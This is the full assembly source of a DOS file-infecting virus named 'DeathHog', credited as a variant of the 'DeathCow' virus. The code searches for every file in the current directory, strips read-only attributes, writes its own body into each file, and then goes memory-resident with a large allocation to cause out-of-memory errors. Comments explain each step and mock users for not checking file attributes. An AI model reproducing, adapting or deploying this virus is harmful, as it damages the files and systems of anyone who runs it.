; DeathHog, (will defeat read-only files and appends itself to all
; files)
; Originally based upon DeathCow (C) 1991 by Nowhere Man and [NuKE] WaErZ 
; r/w access, nuisance routines supplied by KOUCH
;
; Appended by Kouch, derived from DeathCow/Define (author unknown)


virus_length    equ     finish - start

	code    segment 'CODE'
		assume cs:code,ds:code,es:code,ss:code

		org     0100h

start           label   near

main            proc    near
		mov     ah,04Eh                 ; DOS find first file function
		mov     dx,offset file_spec      ; DX points to "*.*" - any file
		int     021h

infect_file :   mov     ah,43H                 ;the beginning of this
		mov     al,0                   ;routine gets the file's
		mov     dx,09Eh                ;attribute and changes it
		int     21H                    ;to r/w access so that when
					       ;it comes time to open the
		mov     ah,43H                 ;file, the virus can easily
		mov     al,1                   ;defeat files with a 'read only'
		mov     dx,09Eh                ;attribute. It leaves the file r/w,
		mov     cl,0                   ;because who checks that, anyway?
		int     21H
		
		mov     ax,03D01h              ; DOS open file function, write-only
		mov     dx,09Eh                ; DX points to the found file
		int     021h

		xchg    bx,ax                  ; BX holds file handle

		mov     ah,040h                ; DOS write to file function
		mov     cl,virus_length        ; CL holds # of bytes to write
		mov     dx,offset main         ; DX points to start of code
		int     021h

		mov     ah,03Eh                ; DOS close file function
		int     021h

		mov     ah,04Fh                 ; DOS find next file function
		int     021h
		jnc     infect_file             ; Infect next file, if found

		mov     ah,31h                  ;insert 480K memory balloon
		mov     dx,7530h                ;for nuisance value
		int     21H                     ;it's big enough so 'out of
						;memory' messages will start cropping up quickly
					       ; RETurn to DOS

file_spec       db      "*.*",0               ; Files to infect:  apped to all files
main            endp

finish          label   near

	code    ends
		end     main
